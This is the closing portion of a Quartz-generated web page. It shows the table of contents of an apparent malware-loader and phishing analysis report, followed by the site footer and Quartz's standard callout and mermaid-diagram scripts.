href="#5--external-loader-mwminjs--static-analysis--decoding" data-for="5--external-loader-mwminjs--static-analysis--decoding">5 — External loader (mw.min.js) — static analysis &amp; decoding</a></li><li class="depth-2"><a href="#how-the-loader-was-obfuscated" data-for="how-the-loader-was-obfuscated">How the loader was obfuscated</a></li><li class="depth-2"><a href="#what-i-decoded-representative-highlights" data-for="what-i-decoded-representative-highlights">What I decoded (representative highlights)</a></li><li class="depth-1"><a href="#6--server-side-logic-and-platform-dependent-behavior" data-for="6--server-side-logic-and-platform-dependent-behavior">6 — Server-side logic and platform-dependent behavior</a></li><li class="depth-1"><a href="#7--fingerprinting-details-what-the-js-collected-and-how-it-was-used" data-for="7--fingerprinting-details-what-the-js-collected-and-how-it-was-used">7 — Fingerprinting details (what the JS collected and how it was used)</a></li><li class="depth-1"><a href="#8--reconstructed-url-patterns-and-what-they-imply" data-for="8--reconstructed-url-patterns-and-what-they-imply">8 — Reconstructed URL patterns and what they imply</a></li><li class="depth-1"><a href="#9--evidence-of-adwareservice-worker-strategies" data-for="9--evidence-of-adwareservice-worker-strategies">9 — Evidence of adware/service-worker strategies</a></li><li class="depth-1"><a href="#10--impact-assessment-if-you-clicked-the-link" data-for="10--impact-assessment-if-you-clicked-the-link">10 — Impact assessment (if you clicked the link)</a></li><li class="depth-1"><a href="#11--recommendations--remediation-steps" data-for="11--recommendations--remediation-steps">11 — Recommendations &amp; remediation steps</a></li><li class="depth-2"><a href="#immediate-for-users" data-for="immediate-for-users">Immediate (for users)</a></li><li class="depth-2"><a href="#technical--soc" data-for="technical--soc">Technical / SOC</a></li><li class="depth-2"><a href="#reporting--takedown" data-for="reporting--takedown">Reporting / takedown</a></li><li class="depth-1"><a href="#12--appendix-a--key-artifacts-archived" data-for="12--appendix-a--key-artifacts-archived">12 — Appendix A — Key artifacts archived</a></li><li class="depth-1"><a href="#13--appendix-b--short-glossary--what-things-mean" data-for="13--appendix-b--short-glossary--what-things-mean">13 — Appendix B — Short glossary / what things mean</a></li><li class="depth-1"><a href="#14--final-conclusion" data-for="14--final-conclusion">14 — Final conclusion</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.5.2</a> © 2025</p><ul><li><a href="https://github.com/jackyzha0/quartz">GitHub</a></li><li><a href="https://discord.gg/cRFFHYye7t">Discord Community</a></li></ul></footer></div></div></body><script type="application/javascript">function n(){let t=this.parentElement;t.classList.toggle("is-collapsed");let e=t.getElementsByClassName("callout-content")[0];if(!e)return;let l=t.classList.contains("is-collapsed");e.style.gridTemplateRows=l?"0fr":"1fr"}function c(){let t=document.getElementsByClassName("callout is-collapsible");for(let e of t){let l=e.getElementsByClassName("callout-title")[0],s=e.getElementsByClassName("callout-content")[0];if(!l||!s)continue;l.addEventListener("click",n),window.addCleanup(()=>l.removeEventListener("click",n));let o=e.classList.contains("is-collapsed");s.style.gridTemplateRows=o?"0fr":"1fr"}}document.addEventListener("nav",c);
+</script><script type="module">function f(i,e){if(!i)return;function r(o){o.target===this&&(o.preventDefault(),o.stopPropagation(),e())}function t(o){o.key.startsWith("Esc")&&(o.preventDefault(),e())}i?.addEventListener("click",r),window.addCleanup(()=>i?.removeEventListener("click",r)),document.addEventListener("keydown",t),window.addCleanup(()=>document.removeEventListener("keydown",t))}function y(i){for(;i.firstChild;)i.removeChild(i.firstChild)}var h=class{constructor(e,r){this.container=e;this.content=r;this.setupEventListeners(),this.setupNavigationControls(),this.resetTransform()}isDragging=!1;startPan={x:0,y:0};currentPan={x:0,y:0};scale=1;MIN_SCALE=.5;MAX_SCALE=3;cleanups=[];setupEventListeners(){let e=this.onMouseDown.bind(this),r=this.onMouseMove.bind(this),t=this.onMouseUp.bind(this),o=this.resetTransform.bind(this);this.container.addEventListener("mousedown",e),document.addEventListener("mousemove",r),document.addEventListener("mouseup",t),window.addEventListener("resize",o),this.cleanups.push(()=>this.container.removeEventListener("mousedown",e),()=>document.removeEventListener("mousemove",r),()=>document.removeEventListener("mouseup",t),()=>window.removeEventListener("resize",o))}cleanup(){for(let e of this.cleanups)e()}setupNavigationControls(){let e=document.createElement("div");e.className="mermaid-controls";let r=this.createButton("+",()=>this.zoom(.1)),t=this.createButton("-",()=>this.zoom(-.1)),o=this.createButton("Reset",()=>this.resetTransform());e.appendChild(t),e.appendChild(o),e.appendChild(r),this.container.appendChild(e)}createButton(e,r){let t=document.createElement("button");return t.textContent=e,t.className="mermaid-control-button",t.addEventListener("click",r),window.addCleanup(()=>t.removeEventListener("click",r)),t}onMouseDown(e){e.button===0&&(this.isDragging=!0,this.startPan={x:e.clientX-this.currentPan.x,y:e.clientY-this.currentPan.y},this.container.style.cursor="grabbing")}onMouseMove(e){this.isDragging&&(e.preventDefault(),this.currentPan={x:e.clientX-this.startPan.x,y:e.clientY-this.startPan.y},this.updateTransform())}onMouseUp(){this.isDragging=!1,this.container.style.cursor="grab"}zoom(e){let r=Math.min(Math.max(this.scale+e,this.MIN_SCALE),this.MAX_SCALE),t=this.content.getBoundingClientRect(),o=t.width/2,n=t.height/2,c=r-this.scale;this.currentPan.x-=o*c,this.currentPan.y-=n*c,this.scale=r,this.updateTransform()}updateTransform(){this.content.style.transform=`translate(${this.currentPan.x}px, ${this.currentPan.y}px) scale(${this.scale})`}resetTransform(){this.scale=1;let e=this.content.querySelector("svg");this.currentPan={x:e.getBoundingClientRect().width/2,y:e.getBoundingClientRect().height/2},this.updateTransform()}},C=["--secondary","--tertiary","--gray","--light","--lightgray","--highlight","--dark","--darkgray","--codeFont"],E;document.addEventListener("nav",async()=>{let e=document.querySelector(".center").querySelectorAll("code.mermaid");if(e.length===0)return;E||=await import("https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.esm.min.mjs");let r=E.default,t=new WeakMap;for(let n of e)t.set(n,n.innerText);async function o(){for(let s of e){s.removeAttribute("data-processed");let a=t.get(s);a&&(s.innerHTML=a)}let n=C.reduce((s,a)=>(s[a]=window.getComputedStyle(document.documentElement).getPropertyValue(a),s),{}),c=document.documentElement.getAttribute("saved-theme")==="dark";r.initialize({startOnLoad:!1,securityLevel:"loose",theme:c?"dark":"base",themeVariables:{fontFamily:n["--codeFont"],primaryColor:n["--light"],primaryTextColor:n["--darkgray"],primaryBorderColor:n["--tertiary"],lineColor:n["--darkgray"],secondaryColor:n["--secondary"],tertiaryColor:n["--tertiary"],clusterBkg:n["--light"],edgeLabelBackground:n["--highlight"]}}),await r.run({nodes:e})}await o(),document.addEventListener("themechange",o),window.addCleanup(()=>document.removeEventListener("themechange",o));for(let n=0;n<e.length;n++){let v=function(){let g=l.querySelector("#mermaid-space"),m=l.querySelector(".mermaid-content");if(!m)return;y(m);let w=c.querySelector("svg").cloneNode(!0);m.appendChild(w),l.classList.add("active"),g.style.cursor="grab",u=new h(g,m)},M=function(){l.classList.remove("active"),u?.cleanup(),u=null},c=e[n],s=c.parentElement,a=s.querySelector(".clipboard-button"),d=s.querySelector(".expand-button"),p=window.getComputedStyle(a),L=a.offsetWidth+parseFloat(p.marginLeft||"0")+parseFloat(p.marginRight||"0");d.style.right=`calc(${L}px + 0.3rem)`,s.prepend(d);let l=s.querySelector("#mermaid-container");if(!l)return;let u=null;d.addEventListener("click",v),f(l,M),window.addCleanup(()=>{u?.cleanup(),d.removeEventListener("click",v)})}});
+</script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript"></script><script src="./postscript.js" type="module"></script></html>
